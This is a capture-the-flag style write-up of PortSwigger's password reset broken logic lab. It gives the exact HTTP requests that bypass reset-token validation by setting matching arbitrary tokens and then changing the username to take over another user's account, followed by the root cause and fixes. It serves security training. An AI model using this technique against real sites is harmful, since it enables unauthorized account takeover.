# Authentication Vulnerabilities

## Password Reset Broken Logic



### Definition



A **Password Reset Vulnerability** occurs when the password-reset mechanism does not properly validate the reset 
request, allowing an attacker to reset another user's password.




In **Broken Password Reset Logic**, the application fails to properly validate and bind the password-reset token to the intended account.



---



## Lab Goal




The lab contains a vulnerable password-reset functionality.



**Goal:**



1. Reset Carlos's password.

2. Log in to Carlos's account.

3. Access the **My account** page.



### Credentials



```text

wiener:peter

```



Victim:



```text

carlos

```



---



## Exploitation



### 1. Request a Password Reset



Request a password reset for:



```text

wiener

```



The reset link contains a temporary token:


```text

/forgot-password?temp-forgot-password-token=TOKEN

```




---



### 2. Inspect the Password Reset Request




The reset token appears in two places.



**URL:**



```http

POST /forgot-password?temp-forgot-password-token=TOKEN

```



**Body:**



```text

temp-forgot-password-token=TOKEN&username=wiener&new-password-1=password&new-password-2=password

```



---


### 3. Test Token Validation




Change the token in **both locations** to an arbitrary value:


```text

x

```



Request:



```http

POST /forgot-password?temp-forgot-password-token=x

```



Body:


```text



temp-forgot-password-token=x&username=wiener&new-password-1=password&new-password-2=password

```


If the application accepts the request, this indicates that it is not properly validating the token.



---



### 4. Change the Target Username



Change:




```text

username=wiener

```



to:



```text

username=carlos

```



Final request:



```http

POST /forgot-password?temp-forgot-password-token=x

```




```text

temp-forgot-password-token=x&username=carlos&new-password-1=password&new-password-2=password

```



Send the request.



---


### 5. Log in as Carlos



The password is now:




```text

password


```



Log in using:



```text


Username: carlos

Password: password


```



Then access:




```text

/my-account

```



The lab is solved.


---




## Root Cause



The application does not properly validate the reset token or bind it to the account being reset.




Instead of verifying:






```text

Is the token valid?

        ↓


Is it still active?

        ↓

Does it belong to this user?

        ↓

Allow password reset


```



the application effectively checks whether:



```text

URL Token == Body Token

```




Therefore, an attacker can use:



```text

x == x

```



and then change:



```text

username=wiener

```



to:




```text

username=carlos

```



This allows the attacker to reset Carlos's password.



---




## Impact



Successful exploitation can lead to:



* Password reset of another user's account.

* Account takeover.

* Unauthorized access to private data and functionality.

* Bypass of the intended password-reset security mechanism.



---



## Key Notes



* Reset tokens must be **cryptographically secure**.

* Tokens must be validated server-side.

* Tokens should expire after a limited period.

* A reset token must be bound to the intended user/account.


* Comparing two attacker-controlled token values is not sufficient validation.

* The username/account being reset must not be trusted without proper token validation.

* Password-reset functionality is part of the authentication system and must be strongly protected.


---


## Attack Flow




```text

Request Password Reset

        ↓

Obtain a valid reset link
        ↓

Send the reset request to Repeater

        ↓

Change URL token → x

Change body token → x
        ↓

Application accepts the matching values

        ↓

Change username → carlos
        ↓


Set a new password

        ↓

Login as Carlos

        ↓

Account Takeover

```



---



## Official Source



[PortSwigger — Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic?utm_source=chatgpt.com)
